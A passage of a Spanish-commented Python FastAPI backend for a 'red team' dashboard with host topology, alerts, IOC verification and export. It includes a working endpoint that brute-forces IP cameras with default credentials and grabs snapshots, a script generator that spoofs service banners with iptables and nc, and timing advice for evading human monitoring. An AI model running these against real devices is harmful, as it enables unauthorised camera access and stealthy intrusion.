    for h, d, s in all_slots[:3]:
        best_windows.append({"day": days[d], "hour": f"{h:02d}:00", "historical_activity": s})

    return {
        "host": host, "optimal_windows": best_windows,
        "tactic": "Operar en estas franjas minimiza probabilidad de deteccion por monitoreo humano."
    }

# ─── 4. CHAOS FINGERPRINT ────────────────────────────────────────

@app.post("/api/blackmirror/chaos/apply")
async def bm_chaos_apply(real_port: int = Query(...), fake_os: str = Query("Windows Server 2019"),
                         fake_service: str = Query("Microsoft-IIS/10.0")):
    """Regla de envenenamiento de huellas."""
    conn = _sqlite3.connect(BM_DB)
    c = conn.cursor()
    c.execute("INSERT INTO chaos_rules (real_service, fake_banner, fake_os, port) VALUES (?, ?, ?, ?)",
              (fake_service, fake_service, fake_os, real_port))
    rule_id = c.lastrowid
    conn.commit()
    conn.close()

    script_path = os.path.join(SHADOW_DIR, f"chaos_{rule_id}.sh")
    redirector = f"""#!/bin/bash
# Chaos Fingerprint Rule {rule_id}
# Puerto real: {real_port} -> Responde como: {fake_os} / {fake_service}

iptables -t nat -A PREROUTING -p tcp --dport {real_port} -j REDIRECT --to-port {real_port + 20000}

while true; do
    echo -e "HTTP/1.1 200 OK\\r\\nServer: {fake_service}\\r\\nX-Powered-By: ASP.NET\\r\\n\\r\\n<html><body>IIS Windows Server</body></html>" | nc -l -p {real_port + 20000}
done &
"""
    with open(script_path, "w") as f:
        f.write(redirector)
    os.chmod(script_path, 0o755)

    await broadcast({"type": "blackmirror", "payload": f"Chaos aplicado: puerto {real_port} ahora simula {fake_os}"})
    return {
        "rule_id": rule_id, "real_port": real_port, "fake_os": fake_os,
        "fake_service": fake_service, "script": script_path,
        "warning": "Ejecuta el script como root. Esto redirige trafico real. Usalo solo en entornos controlados."
    }

@app.get("/api/blackmirror/chaos/status")
async def bm_chaos_status():
    conn = _sqlite3.connect(BM_DB)
    c = conn.cursor()
    c.execute("SELECT id, real_service, fake_banner, fake_os, port, active FROM chaos_rules ORDER BY id DESC")
    rows = c.fetchall()
    conn.close()
    return {"rules": [
        {"id": r[0], "real": r[1], "fake_banner": r[2], "fake_os": r[3], "port": r[4], "active": bool(r[5])}
        for r in rows
    ]}

# == END BLACK MIRROR ================================================

# ═════════════════════════════════════════════════════════════════════════════
#  SQLite PERSISTENCE — Topología, IoT, Alertas, SOAR, Settings, IOCs
#  (Merge del backend v3.1-enhanced — conserva auth existente con API key)
# ═════════════════════════════════════════════════════════════════════════════

import sqlite3 as _sqlite3_v2

DB_PATH_V2 = BASE.parent / "redteam.db"

class DatabaseV2:
    def __init__(self, path):
        self.path = path
        self._init_db()

    def _conn(self):
        c = _sqlite3_v2.connect(str(self.path), check_same_thread=False)
        c.row_factory = _sqlite3_v2.Row
        return c

    def _init_db(self):
        with self._conn() as c:
            c.executescript("""
                CREATE TABLE IF NOT EXISTS v2_hosts (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    ip TEXT UNIQUE NOT NULL,
                    hostname TEXT,
                    mac TEXT,
                    os_guess TEXT,
                    risk_score INTEGER DEFAULT 0,
                    first_seen REAL,
                    last_seen REAL,
                    ports TEXT DEFAULT '[]',
                    tags TEXT DEFAULT '[]',
                    metadata TEXT DEFAULT '{}'
                );
                CREATE TABLE IF NOT EXISTS v2_cameras (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    ip TEXT NOT NULL,
                    port INTEGER DEFAULT 80,
                    vendor TEXT,
                    model TEXT,
                    snapshot_url TEXT,
                    credentials_tested INTEGER DEFAULT 0,
                    credentials_found TEXT DEFAULT '[]',
                    last_seen REAL
                );
                CREATE TABLE IF NOT EXISTS v2_alerts (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    severity TEXT NOT NULL,
                    title TEXT,
                    message TEXT,
                    source TEXT,
                    ts REAL,
                    metadata TEXT DEFAULT '{}',
                    acknowledged INTEGER DEFAULT 0
                );
                CREATE TABLE IF NOT EXISTS v2_iocs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    ioc_type TEXT NOT NULL,
                    value TEXT NOT NULL,
                    source TEXT,
                    confidence INTEGER DEFAULT 50,
                    ts REAL
                );
                CREATE TABLE IF NOT EXISTS v2_playbooks (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    name TEXT NOT NULL,
                    description TEXT,
                    steps TEXT DEFAULT '[]',
                    created_at REAL
                );
                CREATE TABLE IF NOT EXISTS v2_settings (
                    key TEXT PRIMARY KEY,
                    value TEXT
                );
            """)

    # ── Hosts ──
    def get_hosts(self, limit=100, offset=0, search="", risk_min=0, risk_max=100, tag=""):
        q = "SELECT * FROM v2_hosts WHERE risk_score >= ? AND risk_score <= ?"
        params = [risk_min, risk_max]
        if search:
            q += " AND (ip LIKE ? OR hostname LIKE ? OR os_guess LIKE ?)"
            s = f"%{search}%"
            params += [s, s, s]
        if tag:
            q += " AND tags LIKE ?"
            params += [f"%\"{tag}\"%"]
        q += " ORDER BY last_seen DESC LIMIT ? OFFSET ?"
        params += [limit, offset]
        with self._conn() as c:
            rows = c.execute(q, params).fetchall()
        return [dict(r) for r in rows]

    def insert_host(self, ip, hostname="", mac="", os_guess="", risk_score=0, ports=None, tags=None, metadata=None):
        now = time.time()
        with self._conn() as c:
            c.execute("""INSERT OR REPLACE INTO v2_hosts
                (ip, hostname, mac, os_guess, risk_score, first_seen, last_seen, ports, tags, metadata)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (ip, hostname, mac, os_guess, risk_score, now, now,
                 json.dumps(ports or []), json.dumps(tags or []), json.dumps(metadata or {})))
            c.commit()
        return True

    def get_graph(self):
        with self._conn() as c:
            rows = c.execute("SELECT * FROM v2_hosts").fetchall()
        nodes = []
        edges = []
        for r in rows:
            d = dict(r)
            risk = d.get("risk_score", 0)
            color = "#ef4444" if risk >= 70 else "#f59e0b" if risk >= 40 else "#22c55e"
            nodes.append({
                "id": d["ip"], "label": d.get("hostname") or d["ip"],
                "group": d.get("os_guess", "unknown"), "value": max(5, risk),
                "color": color, "title": f"{d['ip']} ({d.get('os_guess','?')}) risk={risk}"
            })
            if not d["ip"].endswith(".1"):
                gateway = ".".join(d["ip"].split(".")[:3]) + ".1"
                edges.append({"from": gateway, "to": d["ip"]})
        return {"nodes": nodes, "edges": edges}

    # ── Cameras ──
    def get_cameras(self):
        with self._conn() as c:
            rows = c.execute("SELECT * FROM v2_cameras ORDER BY last_seen DESC").fetchall()
        return [dict(r) for r in rows]

    def insert_camera(self, ip, port=80, vendor="", model="", snapshot_url=""):
        now = time.time()
        with self._conn() as c:
            c.execute("""INSERT INTO v2_cameras
                (ip, port, vendor, model, snapshot_url, credentials_tested, credentials_found, last_seen)
                VALUES (?, ?, ?, ?, ?, 0, '[]', ?)""",
                (ip, port, vendor, model, snapshot_url, now))
            cid = c.execute("SELECT last_insert_rowid()").fetchone()[0]
            c.commit()
        return cid

    def update_camera_creds(self, cam_id, tested, found):
        with self._conn() as c:
            c.execute("UPDATE v2_cameras SET credentials_tested=?, credentials_found=? WHERE id=?",
                      (tested, json.dumps(found), cam_id))
            c.commit()

    # ── Alerts ──
    def get_alerts(self, limit=100):
        with self._conn() as c:
            rows = c.execute("SELECT * FROM v2_alerts ORDER BY ts DESC LIMIT ?", (limit,)).fetchall()
        return [dict(r) for r in rows]

    def add_alert(self, severity, title, message, source="", metadata=None):
        now = time.time()
        with self._conn() as c:
            c.execute("INSERT INTO v2_alerts (severity, title, message, source, ts, metadata, acknowledged) VALUES (?,?,?,?,?,?,0)",
                      (severity, title, message, source, now, json.dumps(metadata or {})))
            c.commit()
        return True

    def ack_alert(self, alert_id):
        with self._conn() as c:
            c.execute("UPDATE v2_alerts SET acknowledged=1 WHERE id=?", (alert_id,))
            c.commit()

    # ── IOCs ──
    def get_iocs(self, ioc_type=""):
        q = "SELECT * FROM v2_iocs"
        params = []
        if ioc_type:
            q += " WHERE ioc_type=?"
            params.append(ioc_type)
        q += " ORDER BY ts DESC"
        with self._conn() as c:
            rows = c.execute(q, params).fetchall()
        return [dict(r) for r in rows]

    def insert_ioc(self, ioc_type, value, source="", confidence=50):
        now = time.time()
        with self._conn() as c:
            c.execute("INSERT INTO v2_iocs (ioc_type, value, source, confidence, ts) VALUES (?,?,?,?,?)",
                      (ioc_type, value, source, confidence, now))
            c.commit()
        return True

    # ── Playbooks ──
    def get_playbooks(self):
        with self._conn() as c:
            rows = c.execute("SELECT * FROM v2_playbooks ORDER BY created_at DESC").fetchall()
        return [dict(r) for r in rows]

    def save_playbook(self, name, description="", steps=None):
        now = time.time()
        with self._conn() as c:
            c.execute("INSERT INTO v2_playbooks (name, description, steps, created_at) VALUES (?,?,?,?)",
                      (name, description, json.dumps(steps or []), now))
            pid = c.execute("SELECT last_insert_rowid()").fetchone()[0]
            c.commit()
        return pid

    # ── Settings ──
    def get_settings(self):
        with self._conn() as c:
            rows = c.execute("SELECT * FROM v2_settings").fetchall()
        return {r["key"]: r["value"] for r in rows}

    def set_setting(self, key, value):
        with self._conn() as c:
            c.execute("INSERT OR REPLACE INTO v2_settings (key, value) VALUES (?,?)", (key, str(value)))
            c.commit()
        return True


db_v2 = DatabaseV2(DB_PATH_V2)

# ── Seed demo data (solo si la DB está vacía) ──
def _seed_v2_if_empty():
    with db_v2._conn() as c:
        count = c.execute("SELECT COUNT(*) FROM v2_hosts").fetchone()[0]
    if count > 0:
        return
    print("[DB-V2] Seeding demo data...")
    demo_hosts = [
        ("192.168.1.1", "router.local", "", "Router/AP", 10, [80, 443, 22]),
        ("192.168.1.10", "cam-sala.local", "", "IP Camera Hikvision", 65, [80, 554, 8000]),
        ("192.168.1.15", "dvr-nvr.local", "", "DVR Hikvision", 75, [80, 554, 8000, 8200]),
        ("192.168.1.20", "workstation-01", "", "Windows 10", 30, [445, 3389]),
        ("192.168.1.25", "printer-hp.local", "", "HP Printer", 15, [80, 443, 9100]),
        ("192.168.1.100", "unknown-device", "", "Unknown", 50, [23, 80]),
    ]
    for ip, host, mac, os_g, risk, ports in demo_hosts:
        db_v2.insert_host(ip, hostname=host, mac=mac, os_guess=os_g, risk_score=risk, ports=ports,
                          tags=["demo"])
    demo_cams = [
        ("192.168.1.10", 80, "Hikvision", "DS-2CD2142FWD-I", "/ISAPI/Streaming/channels/101/picture"),
        ("192.168.1.15", 80, "Hikvision", "DS-7108NI-Q1", "/cgi-bin/snapshot.cgi"),
    ]
    for ip, port, vendor, model, snap in demo_cams:
        db_v2.insert_camera(ip, port, vendor, model, snap)
    db_v2.add_alert("warning", "Cámara Hikvision detectada", "Credenciales por defecto posibles", "iot_scanner", {"ip": "192.168.1.10"})
    db_v2.add_alert("info", "Nuevo host descubierto", "Router gateway detectado", "arp_scan", {"ip": "192.168.1.1"})
    db_v2.add_alert("critical", "Puerto Telnet abierto", "192.168.1.100:23 sin autenticación", "port_scan", {"ip": "192.168.1.100", "port": 23})
    db_v2.insert_ioc("ip", "192.168.1.100", "port_scan", 80)
    db_v2.insert_ioc("port", "23", "telnet_exposed", 90)
    print("[DB-V2] Demo data seeded.")


# ═════════════════════════════════════════════════════════════════════════════
#  ENDPOINTS V2 — Topología, IoT Cameras, Alertas, Export, SOAR, Settings, IOCs
#  (Usan el mismo middleware de auth con API key que el resto del sistema)
# ═════════════════════════════════════════════════════════════════════════════

@app.get("/api/v2/topology/hosts")
async def v2_list_hosts(
    limit: int = Query(100, ge=1, le=500),
    offset: int = Query(0, ge=0),
    search: str = Query(""),
    risk_min: int = Query(0, ge=0, le=100),
    risk_max: int = Query(100, ge=0, le=100),
    tag: str = Query(""),
):
    hosts = db_v2.get_hosts(limit=limit, offset=offset, search=search, risk_min=risk_min, risk_max=risk_max, tag=tag)
    for h in hosts:
        h["ports"] = json.loads(h.get("ports", "[]"))
        h["tags"] = json.loads(h.get("tags", "[]"))
        h["metadata"] = json.loads(h.get("metadata", "{}"))
    return {"hosts": hosts, "count": len(hosts)}

@app.get("/api/v2/topology/graph")
async def v2_topology_graph():
    return db_v2.get_graph()

@app.post("/api/v2/topology/hosts")
async def v2_add_host(request: Request):
    try:
        body = await request.json()
    except:
        body = {}
    ip = body.get("ip", "")
    if not ip:
        return JSONResponse({"error": "ip required"}, status_code=400)
    db_v2.insert_host(
        ip, hostname=body.get("hostname", ""), mac=body.get("mac", ""),
        os_guess=body.get("os_guess", ""), risk_score=body.get("risk_score", 0),
        ports=body.get("ports", []), tags=body.get("tags", []),
        metadata=body.get("metadata", {})
    )
    return {"ok": True, "ip": ip}

@app.get("/api/v2/iot/cameras")
async def v2_list_cameras():
    cams = db_v2.get_cameras()
    for c in cams:
        c["credentials_found"] = json.loads(c.get("credentials_found", "[]"))
    return {"cameras": cams}

@app.post("/api/v2/iot/cameras")
async def v2_add_camera(request: Request):
    try:
        body = await request.json()
    except:
        body = {}
    ip = body.get("ip", "")
    if not ip:
        return JSONResponse({"error": "ip required"}, status_code=400)
    cid = db_v2.insert_camera(ip, body.get("port", 80), body.get("vendor", ""),
                               body.get("model", ""), body.get("snapshot_url", ""))
    return {"ok": True, "id": cid}

@app.get("/api/v2/iot/snapshot/{camera_id}")
async def v2_camera_snapshot(camera_id: int):
    cams = db_v2.get_cameras()
    cam = next((c for c in cams if c["id"] == camera_id), None)
    if not cam:
        return JSONResponse({"error": "camera not found"}, status_code=404)
    ip = cam["ip"]
    port = cam["port"]
    snap_path = cam["snapshot_url"]
    # URLs comunes para Hikvision, Dahua, ONVIF
    candidate_urls = [
        f"http://{ip}:{port}{snap_path}",
        f"http://{ip}:{port}/ISAPI/Streaming/channels/101/picture",
        f"http://{ip}:{port}/cgi-bin/snapshot.cgi",
        f"http://{ip}:{port}/snap.jpg",
        f"http://{ip}:{port}/onvif/snapshot",
        f"http://{ip}:{port}/image/jpeg.cgi",
    ]
    import httpx as _httpx
    for url in candidate_urls:
        try:
            async with _httpx.AsyncClient(timeout=5.0) as client:
                r = await client.get(url)
                if r.status_code == 200 and "image" in r.headers.get("content-type", ""):
                    return Response(content=r.content, media_type="image/jpeg")
        except:
            continue
    return JSONResponse({"error": "snapshot no disponible"}, status_code=502)

@app.post("/api/v2/iot/brute/{camera_id}")
async def v2_brute_camera(camera_id: int):
    cams = db_v2.get_cameras()
    cam = next((c for c in cams if c["id"] == camera_id), None)
    if not cam:
        return JSONResponse({"error": "camera not found"}, status_code=404)
    ip = cam["ip"]
    port = cam["port"]
    # 14 combinaciones comunes de credenciales por defecto
    CREDS = [
        ("admin", "admin"), ("admin", "12345"), ("admin", "pass"),
        ("admin", ""), ("admin", "password"), ("admin", "hikvision"),
        ("root", "root"), ("root", ""), ("root", "pass"),
        ("user", "user"), ("guest", "guest"), ("service", "service"),
        ("supervisor", "supervisor"), ("dahua", "dahua"),
    ]
    found = []
    tested = 0
    import httpx as _httpx
    for user, passwd in CREDS:
        tested += 1
        url = f"http://{ip}:{port}/ISAPI/System/deviceInfo"
        try:
            async with _httpx.AsyncClient(timeout=3.0) as client:
                r = await client.get(url, auth=(user, passwd))
                if r.status_code == 200 and "<" in r.text:
                    found.append({"user": user, "pass": passwd, "status": 200})
                    break
                elif r.status_code == 401:
                    continue
                else:
                    found.append({"user": user, "pass": passwd, "status": r.status_code})
        except:
            continue
    db_v2.update_camera_creds(camera_id, tested, found)
    return {"tested": tested, "found": found, "camera_id": camera_id}

@app.get("/api/v2/alerts")
async def v2_get_alerts(limit: int = Query(100, ge=1, le=500)):
    alerts = db_v2.get_alerts(limit=limit)
    for a in alerts:
        a["metadata"] = json.loads(a.get("metadata", "{}"))
    return {"alerts": alerts}

@app.post("/api/v2/alerts")
async def v2_create_alert(request: Request):
    try:
        body = await request.json()
    except:
        body = {}
    severity = body.get("severity", "info")
    title = body.get("title", "")
    message = body.get("message", "")
    source = body.get("source", "")
    metadata = body.get("metadata", {})
    db_v2.add_alert(severity, title, message, source, metadata)
    return {"ok": True}

@app.get("/api/v2/alerts/stream")
async def v2_alerts_stream(request: Request):
    # Soporta token via query param para EventSource (que no manda headers)
    token = request.query_params.get("token", "")
    if API_KEY and token and token != API_KEY:
        return JSONResponse({"error": "unauthorized"}, status_code=401)

    async def event_stream():
        last_id = 0
        while True:
            alerts = db_v2.get_alerts(limit=10)
            new = [a for a in alerts if a["id"] > last_id]
            for a in new:
                a["metadata"] = json.loads(a.get("metadata", "{}"))
                yield f"data: {json.dumps(a)}\n\n"
                last_id = max(last_id, a["id"])
            await asyncio.sleep(3)
    return StreamingResponse(event_stream(), media_type="text/event-stream")

@app.post("/api/v2/alerts/{alert_id}/ack")
async def v2_ack_alert(alert_id: int):
    db_v2.ack_alert(alert_id)
    return {"ok": True}

@app.get("/api/v2/threatintel/iocs")
async def v2_list_iocs(ioc_type: str = Query("")):
    return {"iocs": db_v2.get_iocs(ioc_type)}

@app.post("/api/v2/threatintel/iocs")
async def v2_add_ioc(request: Request):
    try:
        body = await request.json()
    except:
        body = {}
    ioc_type = body.get("ioc_type", "")
    value = body.get("value", "")
    if not ioc_type or not value:
        return JSONResponse({"error": "ioc_type and value required"}, status_code=400)
    db_v2.insert_ioc(ioc_type, value, body.get("source", ""), body.get("confidence", 50))
    return {"ok": True}

@app.get("/api/v2/soar/playbooks")
async def v2_list_playbooks():
    pbs = db_v2.get_playbooks()
    for p in pbs:
        p["steps"] = json.loads(p.get("steps", "[]"))
    return {"playbooks": pbs}

@app.post("/api/v2/soar/playbooks")
async def v2_save_playbook(request: Request):
    try:
        body = await request.json()
    except:
        body = {}
    name = body.get("name", "")
    if not name:
        return JSONResponse({"error": "name required"}, status_code=400)
    pid = db_v2.save_playbook(name, body.get("description", ""), body.get("steps", []))
    return {"ok": True, "id": pid}

@app.post("/api/v2/soar/execute/{playbook_id}")
async def v2_execute_playbook(playbook_id: int):
    pbs = db_v2.get_playbooks()
    pb = next((p for p in pbs if p["id"] == playbook_id), None)
    if not pb:
        return JSONResponse({"error": "playbook not found"}, status_code=404)
    steps = json.loads(pb.get("steps", "[]"))
    results = []
    for i, step in enumerate(steps):
        results.append({
            "step": i + 1,
            "action": step.get("action", "unknown"),
            "status": "simulated",
            "message": f"Ejecutado: {step.get('action', '?')}"
        })
    db_v2.add_alert("info", "Playbook ejecutado", f"PB#{playbook_id}: {pb['name']}", "soar")
    return {"results": results, "playbook": pb["name"]}

@app.get("/api/v2/settings")
async def v2_get_settings():
    return {"settings": db_v2.get_settings()}

@app.post("/api/v2/settings")
async def v2_set_setting(request: Request):
    try:
        body = await request.json()
    except:
        body = {}
    key = body.get("key", "")
    value = body.get("value", "")
    if not key:
        return JSONResponse({"error": "key required"}, status_code=400)
    db_v2.set_setting(key, value)
    return {"ok": True}

@app.get("/api/v2/export/{fmt}")
async def v2_export(fmt: str):
    if fmt not in ("json", "csv"):
        return JSONResponse({"error": "formato no soportado. Usa json o csv"}, status_code=400)

    hosts = db_v2.get_hosts(limit=500)
    cameras = db_v2.get_cameras()
    alerts = db_v2.get_alerts(limit=500)
    iocs = db_v2.get_iocs()

    if fmt == "json":
        data = {
            "exported_at": datetime.utcnow().isoformat(),
            "hosts": hosts, "cameras": cameras, "alerts": alerts, "iocs": iocs
        }
        return Response(
            content=json.dumps(data, indent=2, ensure_ascii=False, default=str),
            media_type="application/json",
            headers={"Content-Disposition": "attachment; filename=redteam_export.json"}
        )
    elif fmt == "csv":
        lines = ["type,ip/hostname,severity/risk,details,timestamp"]
        for h in hosts:
            lines.append(f"host,{h['ip']},{h.get('risk_score',0)},{h.get('os_guess','')},{datetime.fromtimestamp(h.get('last_seen',0)).isoformat()}")
        for c in cameras:
            lines.append(f"camera,{c['ip']},,{c.get('vendor','')} {c.get('model','')},{datetime.fromtimestamp(c.get('last_seen',0)).isoformat()}")
        for a in alerts:
            lines.append(f"alert,,{a['severity']},{a['title']},{datetime.fromtimestamp(a.get('ts',0)).isoformat()}")
        return Response(
            content="\n".join(lines),
            media_type="text/csv",
            headers={"Content-Disposition": "attachment; filename=redteam_export.csv"}
        )

@app.post("/api/v2/reports/generate")
async def v2_generate_report(request: Request):
    try:
        body = await request.json()
    except:
        body = {}
    report_type = body.get("type", "executive")
    hosts = db_v2.get_hosts(limit=500)
    cameras = db_v2.get_cameras()
    alerts = db_v2.get_alerts(limit=500)
    iocs = db_v2.get_iocs()

    high_risk = [h for h in hosts if h.get("risk_score", 0) >= 70]
    critical_alerts = [a for a in alerts if a["severity"] == "critical"]

    report = {
        "type": report_type,
        "generated_at": datetime.utcnow().isoformat(),
        "summary": {
            "total_hosts": len(hosts),
            "total_cameras": len(cameras),
            "total_alerts": len(alerts),
            "total_iocs": len(iocs),
            "high_risk_hosts": len(high_risk),
            "critical_alerts": len(critical_alerts),
        },
        "high_risk_hosts": high_risk,
        "cameras": cameras,
        "critical_alerts": critical_alerts,
        "recommendations": [
            "Cambiar credenciales por defecto en cámaras detectadas",
            "Cerrar puertos innecesarios (Telnet, FTP)",
            "Segmentar IoT en VLAN dedicada",
            "Habilitar HTTPS en paneles administrativos",
        ] if high_risk or cameras else ["No se encontraron riesgos críticos"],
    }

    ts = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
    reports_dir = ROOT / "reports"
    reports_dir.mkdir(exist_ok=True)
    path = reports_dir / f"report_{report_type}_{ts}.json"
    path.write_text(json.dumps(report, indent=2, ensure_ascii=False, default=str), encoding="utf-8")
    return {"report": report, "path": str(path)}

# == END V2 MERGE ==

# ═════════════════════════════════════════════════════════════════════════════
#  IOC VERIFIER — Verificación activa de Indicadores de Compromiso
#  DNS lookup, port scan, HTTP probe, SSL check, WHOIS
# ═════════════════════════════════════════════════════════════════════════════

import socket as _ioc_socket
import ssl as _ioc_ssl
import concurrent.futures as _ioc_pool
from datetime import datetime as _ioc_dt

def _verify_single_ioc(ioc: dict) -> dict:
    """Verifica un IOC individual: DNS, puertos, HTTP, SSL."""
    ioc_type = ioc.get("type", "ip")
    ioc_value = ioc.get("value", ioc.get("ioc", ""))
    result = {
        "ioc": ioc_value,
        "type": ioc_type,
        "verified_at": _ioc_dt.now().isoformat(),
        "checks": {},
        "alive": False,
    }

    # 1. DNS resolution (para dominios/IPs)
    try:
        if ioc_type in ("domain", "url"):
            resolved = _ioc_socket.getaddrinfo(ioc_value, None, proto=_ioc_socket.IPPROTO_TCP)
            ips = list(set(addr[4][0] for addr in resolved))
            result["checks"]["dns"] = {"status": "ok", "ips": ips}
            target_ip = ips[0] if ips else None
            result["alive"] = bool(ips)
        elif ioc_type == "ip":
            try:
                _ioc_socket.inet_aton(ioc_value)
                result["checks"]["dns"] = {"status": "ok", "ip": ioc_value}
                target_ip = ioc_value
                result["alive"] = True
            except _ioc_socket.error:
                result["checks"]["dns"] = {"status": "error", "error": "IP inválida"}
                target_ip = None
        elif ioc_type == "hash":
            result["checks"]["hash"] = {"status": "info", "value": ioc_value, "len": len(ioc_value)}
            result["alive"] = None  # No se puede verificar un hash con red
            return result
        else:
            target_ip = ioc_value
    except Exception as e:
        result["checks"]["dns"] = {"status": "error", "error": str(e)}
        return result

    if not target_ip:
        return result

    # 2. Port scan (puertos comunes)
    ports_to_check = ioc.get("ports", [80, 443, 22, 554, 8080, 3389, 23])
    if isinstance(ports_to_check, str):
        ports_to_check = [int(p.strip()) for p in ports_to_check.split(",") if p.strip().isdigit()]
    if not ports_to_check:
        ports_to_check = [80, 443, 22, 554, 8080, 3389, 23]

    open_ports = []
    for port in ports_to_check[:10]:  # max 10 puertos
        try:
            s = _ioc_socket.socket(_ioc_socket.AF_INET, _ioc_socket.SOCK_STREAM)
            s.settimeout(2.0)
            if s.connect_ex((target_ip, port)) == 0:
                open_ports.append(port)
                result["alive"] = True
            s.close()
        except Exception:
            pass
    result["checks"]["ports"] = {"open": open_ports, "scanned": ports_to_check[:10]}

    # 3. HTTP probe
    for port in open_ports:
        if port in (80, 8080, 8000, 443, 8443):
            protocol = "https" if port in (443, 8443) else "http"
            url = f"{protocol}://{ioc_value}" if ioc_type in ("domain", "url") else f"{protocol}://{target_ip}"
            try:
                import subprocess as _ioc_sub
                cmd = ["curl", "-sS", "-o", "/dev/null", "-w", "%{http_code}|%{time_total}",
                       "--max-time", "5", "-k", url]
                out = _ioc_sub.run(cmd, capture_output=True, text=True, timeout=7)
                if out.stdout:
                    parts = out.stdout.split("|")
                    result["checks"]["http"] = {
                        "status": "ok",
                        "code": parts[0] if parts else "000",
                        "response_time": parts[1] if len(parts) > 1 else "0",
                        "url": url,
                    }
            except Exception as e:
                result["checks"]["http"] = {"status": "error", "error": str(e)}
            break

    # 4. SSL cert check (para HTTPS)
    if 443 in open_ports:
        try:
            ctx = _ioc_ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = _ioc_ssl.CERT_NONE
            with _ioc_socket.create_connection((target_ip, 443), timeout=5) as sock:
                with ctx.wrap_socket(sock, server_hostname=ioc_value if ioc_type in ("domain","url") else target_ip) as ssock:
                    cert = ssock.getpeercert()
                    result["checks"]["ssl"] = {
                        "status": "ok",
                        "issuer": dict(x[0] for x in cert.get("issuer", [])),
                        "expires": cert.get("notAfter", ""),
                    }
        except Exception as e:
            result["checks"]["ssl"] = {"status": "error", "error": str(e)}

    return result


@app.post("/api/tip/iocs/verify")
async def tip_iocs_verify(request: Request):
    """Verifica IOCs activamente: DNS, puertos abiertos, HTTP, SSL.
    Acepta una lista de IOCs o verifica todos los almacenados si no se envía body."""
    try:
        body = await request.json()
        if isinstance(body, list):
            iocs = body
        elif isinstance(body, dict) and "iocs" in body:
            iocs = body["iocs"]
        else:
            iocs = [body]
    except Exception:
        iocs = _load_json(IOC_FILE, [])

    if not iocs:
        iocs = _load_json(IOC_FILE, [])

    if not iocs:
        return {"ok": True, "results": [], "total": 0, "alive": 0}

    # Verificar en paralelo (max 8 concurrentes)
    with _ioc_pool.ThreadPoolExecutor(max_workers=8) as pool:
        results = list(pool.map(_verify_single_ioc, iocs[:50]))

    alive_count = sum(1 for r in results if r.get("alive"))
    return {
        "ok": True,
        "results": results,
        "total": len(results),
        "alive": alive_count,
        "dead": len(results) - alive_count,
        "verified_at": _ioc_dt.now().isoformat(),
    }


@app.get("/api/tip/iocs/verify")
async def tip_iocs_verify_get():
    """Verifica todos los IOCs almacenados."""
    iocs = _load_json(IOC_FILE, [])
    if not iocs:
        return {"ok": True, "results": [], "total": 0, "alive": 0}

    with _ioc_pool.ThreadPoolExecutor(max_workers=8) as pool:
        results = list(pool.map(_verify_single_ioc, iocs[:50]))

    alive_count = sum(1 for r in results if r.get("alive"))
    return {
        "ok": True,
        "results": results,
        "total": len(results),
        "alive": alive_count,
        "dead": len(results) - alive_count,
        "verified_at": _ioc_dt.now().isoformat(),
    }

# == END IOC VERIFIER ==================================================



# COMPATIBILITY ENDPOINTS - Frontend usa paths sin /v2/

@app.get("/api/alerts/stream")
async def compat_alerts_stream(request: Request):
    """SSE para alertas en tiempo real - alias de /api/v2/alerts/stream."""
    token = request.query_params.get("token", "")
    if API_KEY and token and token != API_KEY:
        return JSONResponse({"error": "unauthorized"}, status_code=401)
    async def event_stream():
        last_id = 0
        while True:
            try:
                alerts = db_v2.get_alerts(limit=50)
                new = [a for a in alerts if a.get("id", 0) > last_id]
                for a in new:
                    a["metadata"] = json.loads(a.get("metadata", "{}"))
                    yield "data: " + json.dumps(a, default=str) + "\n\n"
                    last_id = max(last_id, a.get("id", 0))
            except Exception:
                yield "data: " + json.dumps({"error": "db_unavailable", "timestamp": datetime.utcnow().isoformat()}) + "\n\n"
            await asyncio.sleep(3)
    return StreamingResponse(event_stream(), media_type="text/event-stream", 
                            headers={"Cache-Control": "no-cache", "Connection": "keep-alive"})

@app.get("/api/alerts")
async def compat_alerts_list(limit: int = 100):
    try:
        alerts = db_v2.get_alerts(limit=limit)
        return {"status": "success", "alerts": alerts, "count": len(alerts)}
    except Exception as e:
        return {"status": "error", "alerts": [], "error": str(e)}

@app.get("/api/export")
async def compat_export_json():
    try:
        hosts = db_v2.get_hosts(limit=500)
        cameras = db_v2.get_cameras()
        alerts = db_v2.get_alerts(limit=500)
        iocs = db_v2.get_iocs()
        data = {"exported_at": datetime.utcnow().isoformat(),
                "hosts": hosts, "cameras": cameras, "alerts": alerts, "iocs": iocs}
        return Response(content=json.dumps(data, indent=2, ensure_ascii=False, default=str),
                        media_type="application/json",
                        headers={"Content-Disposition": "attachment; filename=redteam_export.json"})
    except Exception as e:
        return JSONResponse({"error": f"Export failed: {str(e)}"}, status_code=500)

@app.get("/api/export/csv")
async def compat_export_csv():
    try:
        hosts = db_v2.get_hosts(limit=500)
        cameras = db_v2.get_cameras()
        alerts = db_v2.get_alerts(limit=500)
        lines = ["type,ip/hostname,severity/risk,details,timestamp"]
        for h in hosts:
            lines.append(f"host,{h.get('ip','')},{h.get('risk_score',0)},{h.get('os_guess','')},{datetime.fromtimestamp(h.get('last_seen',0)).isoformat()}")
        for c in cameras:
            lines.append(f"camera,{c.get('ip','')},,{c.get('vendor','')} {c.get('model','')},{datetime.fromtimestamp(c.get('last_seen',0)).isoformat()}")
        for a in alerts:
            lines.append(f"alert,,{a.get('severity','')},{a.get('title','')},{datetime.fromtimestamp(a.get('ts',0)).isoformat()}")
        return Response(content="\n".join(lines), media_type="text/csv",
                        headers={"Content-Disposition": "attachment; filename=redteam_export.csv"})
    except Exception as e:
        return JSONResponse({"error": f"Export failed: {str(e)}"}, status_code=500)

@app.get("/api/export/json")
async def compat_export_json_explicit():
    """Alias explicito de /api/export para que ExportPanel.tsx (que pide /api/export/{fmt}) funcione con fmt=json."""
    return await compat_export_json()

@app.get("/api/export/pcap")
async def compat_export_pcap():
    return JSONResponse(
        {"error": "PCAP no disponible: requiere scapy + permisos raw socket. No soportado en Termux sin root."},
        status_code=501
    )

@app.post("/api/reports/generate")
async def compat_reports_generate(request: Request):
